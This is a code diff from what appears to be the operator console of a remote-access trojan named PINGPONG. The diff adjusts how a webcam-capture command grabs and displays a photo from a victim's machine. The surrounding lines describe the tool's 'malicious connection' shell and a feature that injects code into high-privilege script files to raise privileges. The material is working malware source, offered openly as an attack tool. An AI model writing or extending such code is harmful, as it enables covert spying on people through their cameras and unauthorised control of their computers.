@@ -124,20 +124,20 @@ PINGPONG>[*]the PINGPONG shell is a malicious connection and it will start when 
             priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher""")
             main.print_warn("PINGPONG>[!]type 'show_usage' to print out all the activate usage")
         elif command == 'bg' or command == 'BG':
-            main.print_normal('backgrounding session......')
+            main.print_normal('PINGPONG[*]>backgrounding session......')
             if PINGPONG_script.addsend.App_send('BG_APP', False, conn):
                 main.main()
         elif command == "cam_shot" or command == "CAM_SHOT":
             import PINGPONG_script.camera
-            PINGPONG_script.camera.cam_shot(PINGPONG_script.addsend, conn)
-            try:
-                import cv2      
-                img = cv2.imread('shot.jpg',1)
-                cv2.imshow('imshow',img)
-                cv2.waitKey(0)
-                cv2.destroyAllWindows()
-            except:
-                print("PINGPONG>[*]Failed to open it, You might not installed open-cv, but it doesn't really important")
+            if PINGPONG_script.camera.cam_shot(PINGPONG_script.addsend, conn):
+                try:
+                    import cv2      
+                    img = cv2.imread('shot.jpg',1)
+                    cv2.imshow('imshow',img)
+                    cv2.waitKey(0)
+                    cv2.destroyAllWindows()
+                except:
+                    print("PINGPONG>[*]Failed to open it, You might not installed open-cv, but it doesn't really important")
         elif command == "exit" or command == "EXIT":
             conn.send(bytes("EXIT_APP", 'utf8'))
             main.print_normal("PINGPONG>[*]PINGPONG session Died, reason: User exit")
